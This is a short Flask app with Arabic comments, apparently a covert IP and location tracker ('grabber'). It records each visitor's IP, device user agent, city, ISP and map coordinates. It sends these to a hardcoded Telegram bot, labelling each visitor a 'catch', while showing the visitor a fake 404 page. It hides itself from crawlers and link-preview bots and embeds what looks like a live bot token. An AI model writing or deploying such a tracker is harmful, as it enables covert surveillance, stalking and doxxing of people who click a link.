from flask import Flask, request
import requests

app = Flask(__name__)

# بيانات البوت الخاصة بك
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

@app.route('/')
@app.route('/check-status')
def track():
    # جلب الـ IP الحقيقي وتجنب IP السيرفر
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # فلترة البوتات (تجاهل بوتات الفحص التلقائي)
    bots = ['bot', 'facebook', 'vercel', 'screenshot', 'spider', 'crawler']
    if any(bot in user_agent.lower() for bot in bots):
        return "Not Found", 404

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
        lat = geo_res.get('lat', 0)
        lon = geo_res.get('lon', 0)
        
        # رابط مباشر لخرائط جوجل
        google_maps = f"https://www.google.com/maps?q={lat},{lon}"
    except:
        city = country = isp = "Error"
        google_maps = "#"

    report = (
        f"🎯 <b>صيد حقيقي جديد!</b>\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"🗺️ <b>الخريطة:</b> <a href='{google_maps}'>اضغط هنا للموقع</a>\n"
        f"📱 <b>الجهاز:</b> <code>{user_agent}</code>"
    )
    send_to_telegram(report)
    
    return "<h1>404 Not Found</h1>", 200

if __name__ == '__main__':
    app.run()
